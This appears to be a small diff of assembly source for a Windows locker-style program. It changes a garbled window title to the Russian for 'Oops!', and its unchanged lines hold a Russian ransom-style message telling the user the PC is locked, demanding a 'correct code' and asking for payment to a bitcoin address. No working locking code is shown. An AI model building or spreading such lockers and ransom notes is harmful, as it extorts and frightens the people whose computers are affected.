@@ -170,7 +170,7 @@ recls du 'RichEdit20W',0
 edtcls du 'EDIT',0
 btncls du 'BUTTON',0
 
-wndtitle du 'Óïñ!',0
+wndtitle du 'Упс!',0
 btntext du 'OK',0
 fmt du '%s%s',0
 txt du 'ВНИМАНИЕ! ВАШ ПК БЫЛ УПАКОВАН ТЦК!',13,10,'НАПИШИТЕ ПРАВИЛЬНЫЙ КОД И ВАС ОТПУСТЯТ!',13,10,13,10,'БИТКОИН АДДРЕСС: ',0
